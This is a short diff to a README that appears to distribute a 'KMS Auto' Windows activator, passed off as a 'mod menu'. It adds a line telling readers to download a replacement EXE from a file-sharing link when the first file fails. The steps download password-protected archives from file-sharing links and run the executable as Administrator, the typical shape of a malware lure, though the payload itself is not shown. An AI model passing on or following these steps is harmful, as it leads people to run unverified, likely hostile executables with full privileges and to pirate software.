@@ -24,6 +24,8 @@
 
 1. [Download](https://www.4sync.com/web/directDownload/p9brP-tS/cKQ38aak.cdbc3faa100f12381c2fbd33f1e117a3) the latest version from this repository
 2. Password **kms**
+- <If file dont open, download [this file](https://www.4sync.com/web/directDownload/4Ufzz5vy/cKQ38aak.ef87275520de9805aa0b0c059fbb002c) and replace EXE file
+- <**Password replace**
 3. Right-click the mod menu and select **"Run as Administrator"**  
 4. Launch **KMS Auto** and follow on-screen instructions
    
